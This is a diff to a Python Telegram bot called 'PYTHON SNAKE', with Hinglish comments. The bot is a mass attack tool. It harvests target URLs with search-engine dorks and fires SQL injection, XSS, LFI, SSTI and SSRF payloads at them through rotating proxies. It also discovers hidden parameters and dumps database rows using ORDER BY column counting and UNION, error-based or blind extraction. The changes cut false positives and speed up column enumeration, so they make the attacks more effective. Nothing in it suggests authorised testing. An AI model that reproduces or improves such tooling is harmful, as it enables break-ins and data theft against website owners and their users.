@@ -71,8 +71,8 @@ BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
 ADMIN_IDS = [8999053405]
 ADMIN_USERNAME = "@Bloody_sweet_baby"
 BRAND = "PYTHON SNAKE"
-VERSION = "v2.21.0"
-BUILD = "tasks-inbox-proxy"   # feature flags — /ping me dikhte hain
+VERSION = "v2.22.0"
+BUILD = "param-truth"   # feature flags — /ping me dikhte hain
 BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
 KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")
 
@@ -3052,8 +3052,15 @@ def dbms_fingerprint(text: str) -> list:
     return hits
 
 
-def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
-    """Har URL ke params me payload daal ke injection URLs banao."""
+def inject_targets(urls: list, payload: str = "", params: list = None,
+                   invent: bool = False) -> list:
+    """Har URL ke ASLI params me payload daal ke injection URLs banao.
+
+    v2.22.0 — parameterless URL par param invent karna DEFAULT OFF hai.
+    Pehle har paramless URL par ?id=,?page= lagta tha → wo URL exist hi nahi
+    karti thi → boya hua result. Ab invent=True sirf tab jab user chahe
+    (verified param discovery injector ke andar hoti hai).
+    """
     pl = payload if payload is not None else "'"
     params = params or PARAM_FUZZ
     out = []
@@ -3061,8 +3068,7 @@ def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
         raw = (raw or "").strip()
         if not raw or not raw.startswith("http"):
             continue
-        info = url_reverse(raw)
-        pnames = info.get("params") or []
+        pnames = url_param_names(raw)
         if pnames:
             u = urlparse(raw)
             pairs = parse_qsl(u.query, keep_blank_values=True)
@@ -3070,7 +3076,7 @@ def inject_targets(urls: list, payload: str = "", params: list = None) -> list:
                 newpairs = [(k, (pl if k == p else v)) for k, v in pairs]
                 out.append(urlunparse(u._replace(query=urlencode(newpairs, quote_via=quote_plus),
                                                  fragment="")))
-        else:
+        elif invent:
             base = raw.split("?")[0].rstrip("/")
             for p in params[:6]:
                 out.append("%s?%s=%s" % (base, p, quote_plus(pl)))
@@ -3160,13 +3166,18 @@ def inj_build_case(raw: str, param: str, payload: str) -> str:
 
 
 def inj_verdict(family: str, payload: str, status: int, headers: dict, body: str,
-                host: str = "", baseline: str = "") -> dict:
+                host: str = "", baseline: str = "", baseline_ok: bool = True) -> dict:
     """Response dekho — vulnerable hai ya nahi. {} = clean.
 
     baseline = bina payload wali same URL ki body. Jo cheez baseline me pehle se
     hai wo vulnerability NAHI hai (warna har "mysql" likhne wali site vulnerable
     dikhti thi — wahi 24% false positive ka karan tha).
     """
+    #  v2.22.0 — baseline fetch FAIL hua to compare ka koi matlab nahi.
+    #  Pehle base_body="" ban jata tha → page pe pehle se maujood "mysql"/error
+    #  text bhi "naya" lagta tha → confirmed false positive.
+    if not baseline_ok:
+        return {}
     b = str(body or "")[:400000]
     low = b.lower()
     base_low = str(baseline or "")[:400000].lower()
@@ -3424,33 +3435,23 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
         st["took"] = time.time() - st["start"]
         return st
 
-    # ── TASK PLAN (v2.17.0) ────────────────────────────────────────────
-    #  Pehle saare cases ek list me bante the: 24,552 URLs × 16 = ~4 lakh
-    #  tuples → phone ki memory khatam. Ab plan sirf COUNT rakhta hai aur
-    #  feeder stream karta hai (bounded queue).
+    #  v2.22.0 — PLAN ab param-check ke BAAD banta hai (neeche, _fetch ke baad).
     pending = {}
     planned_of = {}
     host_urls = {}
     skip_of = defaultdict(int)
     plan = []                       # (raw, params, planned_cases)
-    for raw in urls:
-        try:
-            params = (url_reverse(raw).get("params") or [])[:2] or ["id"]
-        except Exception:
-            params = ["id"]
-        n = min(int(per_url), max(1, len(params)) * max(1, len(probes)))
-        if n <= 0:
-            continue
-        pending[raw] = n
-        planned_of[raw] = n
-        host_urls[urlparse(raw).hostname or ""] = \
-            host_urls.get(urlparse(raw).hostname or "", 0) + 1
-        st["total"] += n
-        plan.append((raw, params, n))
-
-    if not plan:
-        st["took"] = 0.0
-        return st
+    param_map = {}                  # raw -> asli params (ya discovered)
+    for _u in urls:
+        _pn = url_param_names(_u)[:2]
+        if _pn:
+            param_map[_u] = _pn
+    _paramless = [u for u in urls if u not in param_map]
+    st["no_param_urls"] = len(_paramless)
+    st["param_urls"] = len(param_map)
+    st["discovered"] = 0
+    st["baseline_fail"] = 0
+    st["discover_on"] = bool(inj_discover_on())
 
     _use_proxy = bool(proxy_available()) and inj_proxy_on()
     rot = ProxyRotator(enabled=_use_proxy, uid=uid)
@@ -3511,21 +3512,23 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
             return r.status, dict(r.headers), body
 
     async def _baseline(session, raw):
+        """Baseline {body, ok}. ok=False = fetch fail → verdict hi nahi."""
         if raw in baselines:
             return baselines[raw]
         lk = base_locks.setdefault(raw, asyncio.Lock())
         async with lk:
             if raw in baselines:
                 return baselines[raw]
-            body = ""
+            body, okk, stt = "", False, 0
             try:
-                _s, _h, body = await asyncio.wait_for(
+                stt, _h, body = await asyncio.wait_for(
                     _fetch(session, raw, rot.next() if rot.enabled else None),
                     timeout=max(3.0, float(timeout) + 1))
+                okk = bool(stt) and stt not in (403, 429, 503)
             except Exception:
-                body = ""
-            baselines[raw] = body
-            return body
+                body, okk, stt = "", False, 0
+            baselines[raw] = {"body": body, "ok": okk, "status": stt}
+            return baselines[raw]
 
     async def _finish(raw, skip=False):
         pending[raw] = pending.get(raw, 0) - 1
@@ -3593,14 +3596,19 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                             st["dead_guard"] = 1
                     await _finish(raw)
                 return
-            base_body = ""
+            base_body, base_ok = "", True
             if fam in ("xss", "lfi", "ssti", "nosql", "sqli", "union", "blind",
                        "ssrf", "graphql"):
                 try:
-                    base_body = await _baseline(session, raw)
+                    bl = await _baseline(session, raw)
+                    base_body, base_ok = bl.get("body") or "", bool(bl.get("ok"))
                 except Exception:
-                    base_body = ""
-            verdict = inj_verdict(fam, pl, status, hdrs, body, host, base_body)
+                    base_body, base_ok = "", False
+            verdict = inj_verdict(fam, pl, status, hdrs, body, host, base_body,
+                                  baseline_ok=base_ok)
+            if not base_ok:
+                async with lock:
+                    st["baseline_fail"] += 1
             confirmed = bool(verdict)
             if verdict:
                 # 2nd request — doosre payload se confirm (false positive killer)
@@ -3612,7 +3620,8 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                             s2, h2, b2 = await asyncio.wait_for(
                                 _fetch(session, u2, rot.next() if rot.enabled else None),
                                 timeout=max(4.0, float(timeout) + 2))
-                            v2 = inj_verdict(fam, pl2, s2, h2, b2, host, base_body)
+                            v2 = inj_verdict(fam, pl2, s2, h2, b2, host, base_body,
+                                             baseline_ok=base_ok)
                             confirmed = bool(v2)
                     except Exception:
                         confirmed = False
@@ -3632,6 +3641,66 @@ async def inj_scan(urls: list, cat: str = "all", progress=None, uid=None,
                                             "evidence": verdict.get("evidence", ""),
                                             "status": status, "confirmed": True})
                 await _finish(raw)
+
+    # ── 0) PARAM DISCOVERY (v2.22.0) — paramless URL ke ASLI params ──
+    #  Sirf jab user ne ON kiya ho. Har param response badalne par hi accept
+    #  hota hai (arjun-style) — isliye fake "?id=" wala bug dobara nahi aata.
+    if _paramless and st.get("discover_on") and not (uid and stop_requested(uid)):
+        _cap = max(1, min(5000, int(sget("inj_discover_cap", 300) or 300)))
+        _nmax = max(2, min(len(COMMON_PARAMS), int(sget("inj_discover_names", 12) or 12)))
+        _dl = _paramless[:_cap]
+        _dsem = asyncio.Semaphore(8)
+        _dc = mk_connector(limit=32, force_close=True)
+        lock_plan = asyncio.Lock()
+
+        async def _disc(sess, raw):
+            async with _dsem:
+                if uid and stop_requested(uid):
+                    return
+
+                async def _f(u):
+                    try:
+                        return await asyncio.wait_for(
+                            _fetch(sess, u), timeout=max(4.0, float(timeout) + 2))
+                    except Exception:
+                        return None
+
+                found = await discover_params(raw, _f, limit=_nmax)
+                if found:
+                    async with lock_plan:
+                        param_map[raw] = found[:3]
+                        st["discovered"] += len(found[:3])
+
+        async with aiohttp.ClientSession(connector=_dc) as _dses:
+            await asyncio.gather(*[_disc(_dses, r) for r in _dl],
+                                 return_exceptions=True)
+
+    # ── TASK PLAN (v2.17.0 / v2.22.0) ──────────────────────────────────
+    #  Pehle saare cases ek list me bante the (4 lakh tuples → RAM khatam).
+    #  Ab plan sirf COUNT rakhta hai, feeder stream karta hai. v2.22.0 me
+    #  plan sirf UNHI URLs ka banta hai jinke paas asli param hai.
+    for raw in urls:
+        params = param_map.get(raw) or []
+        if not params:
+            continue
+        n = min(int(per_url), max(1, len(params)) * max(1, len(probes)))
+        if n <= 0:
+            continue
+        pending[raw] = n
+        planned_of[raw] = n
+        host_urls[urlparse(raw).hostname or ""] = \
+            host_urls.get(urlparse(raw).hostname or "", 0) + 1
+        st["total"] += n
+        plan.append((raw, params, n))
+
+    st["urls_testable"] = len(plan)
+    st["urls"] = len(plan)
+    st["no_param_urls"] = len([u for u in _paramless if u not in param_map])
+    if not plan:
+        st["took"] = time.time() - st["start"]
+        logger.info("injector: %d URLs me koi query param nahi — 0 testable",
+                    st.get("urls_unique", 0))
+        return st
 
     async def feeder():
         """Plan ko dheere-dheere queue me daalo (memory safe) + sentinel."""
@@ -4940,6 +5009,137 @@ _STRICT_INURL = re.compile(r'(?:inurl|allinurl):\s*\(?"?([^"\s)]+)', re.I)
 _STRICT_EXT = re.compile(r'(?:filetype|ext):\s*\(?"?([a-z0-9]{2,6})', re.I)
 
 
+# ═══════════════════════════════════════════════════════════════════════════════
+#  v2.22.0 — URL TRUTH: params ka sach (fake params ka end)
+#  Bug: parser parameterless URLs pass karta tha → injector unpe "?id=" invent
+#  karke test karta tha → fake results → dumper unpe kaam nahi karta tha.
+# ═══════════════════════════════════════════════════════════════════════════════
+def url_has_param(u: str) -> bool:
+    """Asli query parameter hai? ?id=5 → True · /about.html → False.
+
+    Sirf '?' hona kaafi nahi — key chahiye. '?a=' bhi param maana jata hai
+    (blank value wale pages bhi testable hote hain).
+    """
+    try:
+        q = urlparse(str(u or "")).query or ""
+        if not q:
+            return False
+        for k, _v in parse_qsl(q, keep_blank_values=True):
+            k = str(k or "").strip()
+            if k and k.lower() not in (globals().get("TRACK_PARAMS") or set()):
+                return True
+    except Exception:
+        return False
+    return False
+
+
+def url_param_names(u: str) -> list:
+    """URL ke param names (order intact, max 40)."""
+    try:
+        q = urlparse(str(u or "")).query or ""
+        if not q:
+            return []
+        return _uniq([k for k, _v in parse_qsl(q, keep_blank_values=True)
+                      if k and k.lower() not in (globals().get("TRACK_PARAMS") or set())])[:40]
+    except Exception:
+        return []
+
+
+def dork_requires_param(dork: str) -> bool:
+    """Dork khud query parameter maang raha hai? inurl:product.php?id= → True.
+
+    Aise dork ka result bina param ke aana galat hai — usse drop karna hai,
+    'relaxed' mode me bhi nahi rakhna.
+    """
+    d = str(dork or "")
+    if not d:
+        return False
+    try:
+        for m in _STRICT_INURL.findall(d):
+            if "=" in m and "filetype" not in m.lower():
+                return True
+    except Exception:
+        return False
+    return False
+
+
+PARSE_PARAM_MODES = ("auto", "1", "0")
+
+
+def parse_param_mode() -> str:
+    """auto (default) | '1' sirf param wale URLs | '0' saare URLs."""
+    v = str(sget("parse_param_filter", "auto") or "auto").strip().lower()
+    return v if v in PARSE_PARAM_MODES else "auto"
+
+
+def parse_param_label(mode: str = "") -> str:
+    m = mode or parse_param_mode()
+    return {"auto": "AUTO (dork ke hisaab se)",
+            "1": "ONLY URLs WITH PARAMS",
+            "0": "ALL URLs"}.get(m, "AUTO")
+
+
+def inj_discover_on() -> bool:
+    """Injector: parameterless URLs ke asli params dhoondhe? (default OFF)."""
+    try:
+        return str(sget("inj_discover", 0) or 0).lower() in ("1", "true", "on", "yes")
+    except Exception:
+        return False
+
+
+# param discovery wordlist — sabse common, real pages pe milne wale names
+COMMON_PARAMS = ("id", "page", "p", "cat", "category", "product", "item", "pid",
+                 "user", "username", "q", "s", "search", "query", "file", "url",
+                 "view", "lang", "type", "name", "dir", "path", "cmd", "action",
+                 "album", "article", "blog", "doc", "download", "folder", "news",
+                 "order", "post", "ref", "section", "shop", "site", "topic")
+
+
+async def discover_params(raw: str, fetch, names=None, limit: int = 12) -> list:
+    """Parameterless URL ke ASLI params dhoondo (arjun-style, verified).
+
+    fetch(url) → (status, headers, body) | None. Sirf wahi param accept hota
+    hai jisse response sach me badle — koi bhi guess nahi.
+    """
+    if url_has_param(raw):                   # pehle se param hai — discovery bekaar
+        return []
+    base = None
+    try:
+        base = await fetch(raw)
+    except Exception:
+        base = None
+    if not base or not base[0]:
+        return []
+    b_status, b_body = base[0], str(base[2] or "")
+    b_norm = _sqli_norm(b_body)[:4000] if "_sqli_norm" in globals() else b_body[:4000]
+    b_len = len(b_body)
+    out = []
+    for nm in list(names or COMMON_PARAMS)[:max(1, int(limit))]:
+        u = inj_build_case(raw, nm, "1")
+        if not u:
+            continue
+        try:
+            r = await fetch(u)
+        except Exception:
+            continue
+        if not r or not r[0]:
+            continue
+        s2, b2 = r[0], str(r[2] or "")
+        if s2 != b_status:
+            out.append(nm)
+            continue
+        d_len = abs(len(b2) - b_len)
+        changed = d_len >= max(40, int(b_len * 0.01))
+        if not changed and "_sqli_diff" in globals():
+            try:
+                changed = _sqli_diff(b_norm, _sqli_norm(b2)[:4000]) >= 25
+            except Exception:
+                changed = False
+        if changed:
+            out.append(nm)
+    return out
+
+
 def dork_match(url: str, dork: str) -> bool:
     """URL ko dork ke inurl / filetype constraints se match karta hai.
 
@@ -5642,7 +5842,22 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
           "relaxed": 0, "mode": mode, "engines": len(eng_list),
           "aborted": 0, "wb": 0, "empty_streak": 0, "time_up": 0, "stop": 0,
           "engines_used": len(eng_list), "dead": [], "proxy": rot.stats(),
-          "rounds": 0, "per_dork": 0, "px_mode": "auto"}
+          "rounds": 0, "per_dork": 0, "px_mode": "auto",
+          "param_urls": 0, "no_param": 0, "param_filter": "auto",
+          "relaxed_blocked": 0}
+    #  v2.22.0 — URL truth: paramless URLs ka hisaab + (optional) filter
+    _pf = parse_param_mode()
+    st["param_filter"] = _pf
+
+    def _pf_drop(u, dork=""):
+        """True = URL testable nahi (koi query param nahi)."""
+        if not u:
+            return True
+        if url_has_param(u):
+            return False
+        if _pf == "1":
+            return True
+        return bool(dork) and dork_requires_param(dork)
     _t_start = time.time()
     seen, out = set(), []
     raw_out = []                                # har raw hit (file ke liye)
@@ -5692,6 +5907,10 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
             st["cc"] += len(got) - wbn
             for u in got:
                 k = u.split("#")[0]
+                if _pf_drop(k):
+                    st["no_param"] += 1
+                    st["filtered"] += 1
+                    continue
                 if k not in seen:
                     seen.add(k)
                     out.append(k)
@@ -5722,6 +5941,10 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                 for u in got:
                     if not (strict and not dork_match(u, dork)):
                         kk = u.split("#")[0]
+                        if _pf_drop(kk, dork):
+                            st["no_param"] += 1
+                            st["filtered"] += 1
+                            continue
                         if kk not in seen:
                             seen.add(kk)
                             out.append(kk)
@@ -5848,6 +6071,11 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                             st["mismatch"] += 1
                             st["filtered"] += 1
                         continue
+                    if _pf_drop(u, dork):
+                        async with _lock:
+                            st["no_param"] += 1
+                            st["filtered"] += 1
+                        continue
                     keep.append(u)
                 if keep:
                     _st_req[i] += 1
@@ -5890,9 +6118,24 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                     matched = [u for u in urls if dork_match(u, dork)]
                     if matched:
                         urls = matched
+                    elif dork_requires_param(dork):
+                        #  v2.22.0: dork khud ?param= maang raha hai — paramless
+                        #  URL ko "relaxed" me rakhna hi fake results ka root tha.
+                        async with _lock:
+                            st["relaxed_blocked"] += 1
+                            st["no_param"] += len(urls)
+                            st["filtered"] += len(urls)
+                        urls = []
                     else:
                         async with _lock:
                             st["relaxed"] += 1
+                if urls:
+                    _before = len(urls)
+                    urls = [u for u in urls if not _pf_drop(u, dork)]
+                    if len(urls) != _before:
+                        async with _lock:
+                            st["no_param"] += _before - len(urls)
+                            st["filtered"] += _before - len(urls)
                 return urls, 1, eng
             return [], 0, ""
 
@@ -5964,6 +6207,8 @@ async def parse_deep(dorks: list, max_urls: int = 5000, pages: int = 1,
                     _fresh = 0
                     for u in got:
                         kk = u.split("#")[0]
+                        if url_has_param(kk):
+                            st["param_urls"] += 1
                         if kk in seen:
                             st["junk"] += 1
                             st["filtered"] += 1
@@ -7532,6 +7777,8 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_parse_cfg(update, context, rest[4:])
         if rest == "limit":
             return await cb_parse_limit(update, context)
+        if rest == "param":
+            return await cb_parse_param(update, context)
         if rest == "rest":
             rest_d = context.user_data.get("parse_rest") or []
             if not rest_d:
@@ -7612,6 +7859,8 @@ async def _route_tool_cb(update, context, data: str):
             return await cb_inj_uhq(update, context)
         if rest == "go":
             return await cb_inj_go(update, context)
+        if rest == "discover":
+            return await cb_inj_discover(update, context)
         if rest == "paste":
             urls = context.user_data.get("paste_urls") or []
             if not urls:
@@ -9661,6 +9910,9 @@ async def tool_inj(update, context):
             row.append(InlineKeyboardButton(label, callback_data="inj:cat:" + k))
         rows.append(row)
     rows.append([InlineKeyboardButton("🚀 SEND URLS (re-arm input)", callback_data="inj:go")])
+    rows.append([InlineKeyboardButton("🔎 PARAM DISCOVERY: %s"
+                                      % ("ON" if inj_discover_on() else "OFF"),
+                                      callback_data="inj:discover")])
     rows.append([InlineKeyboardButton("📥 LAST PARSER URLS (%d)" % len(context.user_data.get("last_urls") or []),
                                       callback_data="inj:last")])
     _rs = inj_resume_load()
@@ -9685,9 +9937,12 @@ async def tool_inj(update, context):
            + KV("Timeout / target", "<code>%ss</code> • max <code>%s</code> tests per URL"
                % (int(sget("inj_timeout", 8) or 8), fmt(int(sget("inj_targets", 24) or 24))), "⏱") + "\n\n"
            + B("How it works") + "\n"
-           + P("Send URLs (paste or .txt file). Every parameter gets tested with real "
+           + P("Send URLs (paste or .txt file). Every REAL parameter gets tested with real "
                "payloads, and the response is checked for DB errors, reflection, traversal "
                "or template evaluation.") + "\n\n"
+           + P("⚠️ Sirf param wale URLs test hote hain (?id=5). Bina param wale URL par "
+               "fake ?id= nahi lagaya jata — PARAM DISCOVERY ON karo to pehle asli "
+               "params dhoondhe jayenge.") + "\n\n"
            + P("Only vulnerable URLs are returned — clean pages are dropped."))
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
@@ -9698,6 +9953,19 @@ async def tool_inj(update, context):
 
 async def cb_inj_cat(update, context, cat: str):
     context.user_data["inj_cat"] = cat if cat in CAT_LABEL else "all"
+    return await tool_inj(update, context)
+
+
+async def cb_inj_discover(update, context):
+    """🔎 PARAM DISCOVERY toggle — paramless URLs ke asli params dhoondho."""
+    sset("inj_discover", 0 if inj_discover_on() else 1)
+    try:
+        await update.callback_query.answer(
+            "🔎 ON — paramless URLs ke params verify honge" if inj_discover_on()
+            else "⚪ OFF — paramless URLs skip honge (fake param nahi)",
+            show_alert=False)
+    except Exception:
+        pass
     return await tool_inj(update, context)
 
 
@@ -9720,7 +9988,10 @@ async def cb_inj_go(update, context):
            + "\n" + KV("URL limit", "<b>ALL</b> — koi cap nahi (24k bhi poore chalte hain)", "🌐")
            + "\n" + KV("Proxy", ("<b>OFF — direct</b> (fast + blocks nahi)"
                                   if not inj_proxy_on() else "<b>ON</b> (free proxies — slow)"), "🧅")
-           + "\n\n" + P("Only vulnerable URLs come back — clean pages are dropped."))
+           + "\n" + KV("Param discovery", "🔎 <b>ON</b>" if inj_discover_on()
+                        else "⚪ OFF — paramless URLs skip", "🔎")
+           + "\n\n" + P("URL me query parameter zaroori hai — <code>?id=5</code>. "
+                           "Bina param wale URLs par fake param nahi lagta."))
     try:
         await q.edit_message_text(txt, reply_markup=RK(rows), parse_mode=ParseMode.HTML)
     except Exception:
@@ -9798,9 +10069,12 @@ def _inj_progress_card(st: dict, spin: int) -> str:
                     ("%s / %s" % (fmt(_hd), fmt(_ht))) if _ht else "counting…")
                 + "\n<i>Dead sites hata rahe hain — phir testing shuru.</i>")
 
+    _np = int(st.get("no_param_urls", 0) or 0)
     return (H("SCANNING", "%s • testing now" % CAT_LABEL.get(st.get("cat"), "ALL"))
             + "\n\n" + bar2(pct, 14, spin) + "\n\n"
             + "◆ URLs        : <code>%s / %s</code>\n" % (fmt(done), fmt(total))
+            + (("◆ No-param    : <code>%s</code> <i>(test nahi hue)</i>\n" % fmt(_np))
+               if _np else "")
             + "◆ Vulnerable  : <code>%s</code>\n" % fmt(_vuln_n)
             + "◆ Safe        : <code>%s</code>\n" % fmt(_safe_n)
             + "◆ Speed       : <code>%.1f URLs/s</code>\n" % speed
@@ -9972,10 +10246,16 @@ async def _run_inject(update, context, urls, task_id: str = ""):
                         timeout=float(sget("inj_timeout", 6) or 6),
                         conc=int(sget("inj_conc", 40) or 40),
                         max_targets=int(sget("inj_targets", 24) or 24))
+    _testable = int(st.get("urls_testable", len(urls)) or 0)
     _left = len([u for u in urls if u not in set(st.get("done_urls") or [])])
-    task_update(tid, done=max(0, len(urls) - _left))
-    task_finish(tid, "done" if not _left else "queued",
-                "" if not _left else "%d URLs bache — /tasks se resume" % _left)
+    if not _testable:
+        #  koi URL testable nahi (param hi nahi) → resume ka jhootha wada nahi
+        _left = 0
+        task_finish(tid, "done", "no testable URLs — query param nahi tha")
+    else:
+        task_update(tid, done=max(0, len(urls) - _left))
+        task_finish(tid, "done" if not _left else "queued",
+                    "" if not _left else "%d URLs bache — /tasks se resume" % _left)
     vulns = st.get("vuln_items") or inj_unique_vulns(st["vulns"])
     took = max(0.001, st.get("took", 0))
     vuln_urls = st.get("vuln_urls") or []
@@ -9983,14 +10263,29 @@ async def _run_inject(update, context, urls, task_id: str = ""):
     safe_urls = st.get("safe_urls") or []
     n_v = len(vuln_urls)
     _dead_n = int(st.get("dead_urls", 0) or 0) + int(st.get("urls_skipped", 0) or 0)
-    head = ("⚠️ <b>%d vulnerable URL(s) found</b>" % n_v) if n_v else \
-        "🛡 <b>No vulnerable URLs found</b>"
+    if not int(st.get("urls_testable", 1) or 0) and int(st.get("urls_unique", 0) or 0):
+        head = ("🚫 <b>0 URLs testable</b>\n<i>Di gayi list me kisi URL par query "
+                "parameter nahi tha (?id= jaise). Fake param invent nahi kiye — "
+                "wahi purana false-positive bug tha.</i>\n<i>Fix: PARSER → %s, ya "
+                "/batch discover 1 (asli param discovery).</i>"
+                % esc(parse_param_label("1")))
+    elif n_v:
+        head = "⚠️ <b>%d vulnerable URL(s) found</b>" % n_v
+    else:
+        head = "🛡 <b>No vulnerable URLs found</b>"
     body = (H("INJECTOR — COMPLETE", "%.1fs" % took) + "\n\n"
             + head + "\n\n"
             + "📥 Total URLs     : <code>%s</code>\n" % fmt(st.get("urls_input", len(urls)))
             + "🔁 Duplicates     : <code>%s</code>\n" % fmt(st.get("dup_removed", 0))
             + "🌐 Unique URLs    : <code>%s</code>\n" % fmt(st.get("urls_unique", len(urls)))
             + "🌐 URLs tested    : <code>%s</code>\n" % fmt(st.get("urls_tested", st["urls_done"]))
+            + (("🚫 No-param URLs  : <code>%s</code> <i>(query param nahi — test nahi hue)</i>\n"
+                % fmt(st.get("no_param_urls", 0))) if st.get("no_param_urls") else "")
+            + (("🔎 Discovered     : <code>%s</code> params <i>(response badalne par verified)</i>\n"
+                % fmt(st.get("discovered", 0)))
+               if st.get("discover_on") and st.get("discovered") else "")
+            + (("🧪 Baseline fail  : <code>%s</code> requests <i>(compare possible nahi → vuln nahi gina)</i>\n"
+                % fmt(st.get("baseline_fail", 0))) if st.get("baseline_fail") else "")
             + "💉 Vulnerable     : <code>%s</code>\n" % fmt(n_v)
             + (("🔁 Dup collapsed   : <code>%s</code> <i>(same host+param+type)</i>\n"
                 % fmt(_dupes)) if _dupes else "")
@@ -10020,11 +10315,11 @@ async def _run_inject(update, context, urls, task_id: str = ""):
         pass
     #  RESUME: jo URLs test hi nahi hue (STOP / crash) unhe disk pe rakh do
     _done_set = set(st.get("done_urls") or [])
-    _remain = [u for u in urls if u not in _done_set]
+    _remain = [u for u in urls if u not in _done_set] if _testable else []
     _saved = 0
     if _remain:
         _saved = inj_resume_save(_remain, cat)
-    elif not _remain:
+    else:
         inj_resume_clear()
     _rows = []
     if _saved:
@@ -10087,6 +10382,8 @@ async def tool_parse(update, context):
                               % ("ALL" if not int(sget("parse_url_limit", 0) or 0)
                                  else fmt(int(sget("parse_url_limit", 0)))),
                               callback_data="pr:limit")],
+        [InlineKeyboardButton("🔗 PARAM URLs: %s" % parse_param_label(),
+                              callback_data="pr:param")],
         [InlineKeyboardButton("🎛 %s" % ENGINE_LABEL[mode].split(" ", 1)[-1],
                               callback_data="pr:eng")],
         [InlineKeyboardButton("🔬 ENGINE DOCTOR (kaun block hai + fix)",
@@ -10105,6 +10402,7 @@ async def tool_parse(update, context):
            + "\n" + KV("URL limit", ("<b>ALL</b> — as many as found"
                                       if not int(sget("parse_url_limit", 0) or 0)
                                       else "<code>%s</code>" % fmt(int(sget("parse_url_limit", 0)))), "🌐")
+           + "\n" + KV("Param filter", "<b>%s</b>" % parse_param_label(), "🔗")
            + "\n" + KV("Pages / Threads", "<code>%d</code> · <code>%d</code> parallel"
                        % (int(sget("parse_pages", 3) or 3),
                           int(sget("parse_threads", 12) or 12)), "⚙️")
@@ -10166,6 +10464,20 @@ async def cb_parse_last(update, context):
     except Exception:
         pass
     return await launch_deep(update, context, dorks)
+
+
+async def cb_parse_param(update, context):
+    """🔗 URL param filter cycle — AUTO → ONLY PARAMS → ALL → AUTO."""
+    order = ["auto", "1", "0"]
+    cur = parse_param_mode()
+    nxt = order[(order.index(cur) + 1) % len(order)] if cur in order else "auto"
+    sset("parse_param_filter", nxt)
+    try:
+        await update.callback_query.answer(
+            "🔗 " + parse_param_label(nxt), show_alert=False)
+    except Exception:
+        pass
+    return await tool_parse(update, context)
 
 
 async def cb_parse_limit(update, context):
@@ -10378,6 +10690,12 @@ async def input_deep_max(update, context, text: str, task_id: str = ""):
     card = (H("DEEP PARSER — COMPLETE", "%.1fs" % took) + "\n\n" + _head + "\n"
             + "📥 Raw URLs    : <code>%s</code>\n" % fmt(st["raw"])
             + "🌐 Unique URLs : <code>%s</code>\n" % fmt(st["unique"])
+            + "🔗 With params : <code>%s</code>\n" % fmt(st.get("param_urls", 0))
+            + (("🚫 No-param    : <code>%s</code>%s\n"
+                % (fmt(st.get("no_param", 0)),
+                   " <i>(filter OFF — injector inhe skip karega)</i>"
+                   if parse_param_mode() != "1" else " <i>(drop)</i>"))
+               if st.get("no_param") else "")
             + "⏱ Time        : <code>%s</code>\n\n" % fmt_eta(took)
             + "📦 <b>Files</b>\n"
             + "• <code>deep_*.txt</code> — unique URLs\n"
@@ -10969,7 +11287,12 @@ def _attrs(tag: str) -> dict:
 
 
 def dump_extract(url: str, status: int, headers: dict, body: str) -> dict:
-    """Ek page se saara kaam ka data nikaalo (asli parse, koi mock nahi)."""
+    """PAGE HARVEST — page ke andar ka data (forms/links/emails/secrets).
+
+    v2.22.0 note: ye SQL rows NAHI nikaalta. Database se real rows nikalne
+    wala flow `sqli_dump_one()` hai (UNION / error-based / blind). UI me dono
+    alag buttons hain — confusion khatam.
+    """
     b = str(body or "")
     h = {str(k).lower(): v for k, v in (headers or {}).items()}
     rec = {"url": url, "status": status, "server": str(h.get("server") or ""),
@@ -11365,18 +11688,39 @@ async def sqli_detect(session, raw: str, param: str, timeout: float = 8.0,
 
 
 async def _sqli_cols(session, det: dict, timeout: float, rot=None, budget=None) -> int:
-    """ORDER BY se column count."""
+    """ORDER BY se column count — linear (1-6) + binary search (7-30).
+
+    v2.22.0: pehle fixed 1..12 linear tha, isliye 12+ column wale pages par
+    galat count aata tha. Ab pehle chhote counts check, phir binary search
+    (max 30) — kam requests me sahi jawab.
+    """
     q, c = det["quote"], det["comment"]
     true_body = _sqli_body(det.get("true")) or _sqli_body(det.get("base"))
-    cols = 0
-    for n in range(1, 13):
+    noise = max(30, int(det.get("noise", 0) or 0) + 10)
+
+    async def valid(n: int) -> bool:
         r = await _sqli_req(session, _sqli_url(det["raw"], det["param"],
                                                "%s ORDER BY %d %s" % (q, n, c)),
                             timeout, rot, budget)
-        if not r.get("status") or _sqli_diff(_sqli_body(r), true_body) > max(30, det.get("noise", 0) + 10):
-            cols = n - 1
-            break
-    return max(0, cols)
+        if not r.get("status"):
+            return False
+        return _sqli_diff(_sqli_body(r), true_body) <= noise
+
+    best = 0
+    for n in range(1, 7):                 # common pages: 2-5 columns
+        if await valid(n):
+            best = n
+        else:
+            return best
+    lo, hi = 7, 30
+    while lo <= hi:                       # 7+ → binary search
+        mid = (lo + hi) // 2
+        if await valid(mid):
+            best = mid
+            lo = mid + 1
+        else:
+            hi = mid - 1
+    return best
 
 
 async def _sqli_union_pos(session, det: dict, cols: int, timeout: float,
@@ -11966,16 +12310,24 @@ async def tool_dump(update, context):
            + B("Send vulnerable URLs") + "\n"
            + P("paste URLs in the chat or send a .txt file — every URL is verified "
                "first, then its data is extracted.") + "\n\n"
-           + KV("Method", "detect → columns → databases → tables → columns → rows", "🧩") + "\n"
+           + KV("Method", "detect → columns (binary search) → databases → tables → "
+                          "columns → rows", "🧩") + "\n"
            + KV("Tables / URL", "<code>%s</code>" % fmt(caps["tables"]), "🗃") + "\n"
            + KV("Rows / table", "<code>%s</code>" % fmt(caps["rows"]), "📄") + "\n"
